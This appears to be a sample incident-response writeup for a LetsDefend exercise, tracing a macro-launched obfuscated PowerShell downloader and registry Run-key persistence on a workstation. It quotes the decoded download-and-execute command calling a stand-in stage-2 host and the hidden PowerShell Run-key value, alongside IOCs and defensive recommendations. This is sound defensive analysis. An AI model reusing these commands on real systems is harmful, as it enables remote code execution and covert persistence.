---
title: "Suspicious PowerShell Execution Leading to Persistence"
date: 2026-07-27 10:00:00 +0300
categories: [Endpoint Forensics, LetsDefend]
tags: [powershell, persistence, t1059, t1547]
description: "Investigating an EDR alert for an obfuscated PowerShell command that established registry-based persistence."
---

> This is an example writeup shipped with the template, showing the expected structure and how it renders. Delete it once you have your own writeups in `_posts/`.
{: .prompt-tip }

> **Platform:** LetsDefend &nbsp;·&nbsp; **Difficulty:** Medium &nbsp;·&nbsp; **Tools:** Sysmon, Event Viewer, VirusTotal, CyberChef
{: .prompt-info }

## Scenario

An EDR alert fired for host `WKSTN-042` reporting an obfuscated PowerShell command line executed by `powershell.exe` with a parent process of `WINWORD.EXE`. The SOC ticket requires determining whether the host was compromised and what persistence, if any, was established.

## Objective

- Determine how the PowerShell process was spawned.
- Decode and analyze the obfuscated command.
- Identify any persistence mechanisms created.
- Assess whether the activity is malicious and scope the impact.

## Tools Used

| Tool | Purpose |
|------|---------|
| Sysmon / Event Viewer | Process creation & registry event logs |
| CyberChef | Base64 / deobfuscation of the PowerShell command |
| VirusTotal | Reputation check of hashes and domains |

## Investigation Steps

### Step 1: Confirm the Process Chain

Reviewed Sysmon Event ID 1 (Process Creation) for the host around the alert time:

```text
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgA...
```

`WINWORD.EXE` spawning `powershell.exe` is a strong indicator of a malicious macro.

### Step 2: Decode the Command

Decoded the Base64 blob via CyberChef (`From Base64` → `Decode text UTF-16LE`):

```powershell
IEX (New-Object Net.WebClient).DownloadString('hxxp://203.0.113.10/stage2.ps1')
```

The command downloads and executes a second-stage script in memory.

### Step 3: Check for Persistence

Reviewed Sysmon Event ID 13 (Registry value set) in the surrounding time window and found a new `Run` key entry:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: "Updater" = "powershell.exe -w hidden -enc <base64>"
```

This re-executes the same downloader on every logon.

## Indicators of Compromise (IOCs)

| Type | Value | Description |
|------|-------|-------------|
| IP | 203.0.113.10 | Stage-2 payload host |
| URL | hxxp://203.0.113.10/stage2.ps1 | Stage-2 script |
| Registry | `HKCU\...\Run\Updater` | Persistence entry |

## Timeline

| Time (UTC) | Event |
|------------|-------|
| 09:14 | User opens phishing attachment `invoice_0472.docm` |
| 09:14 | Macro spawns obfuscated PowerShell |
| 09:15 | Stage-2 script downloaded and executed |
| 09:15 | Registry Run key persistence created |

## MITRE ATT&CK Mapping

| Tactic | Technique |
|--------|-----------|
| Initial Access | T1566.001 – Phishing: Spearphishing Attachment |
| Execution | T1059.001 – PowerShell |
| Persistence | T1547.001 – Registry Run Keys |

## Root Cause / Conclusion

A user opened a malicious macro-enabled Word document that launched an obfuscated PowerShell downloader, which in turn established registry-based persistence. The host is considered compromised and was isolated pending reimaging.

## Lessons Learned / Recommendations

- Block Office applications from spawning `powershell.exe` / `cmd.exe` via ASR rules.
- Alert on `HKCU\...\Run` modifications from non-installer processes.
- User awareness training on macro-enabled attachments.
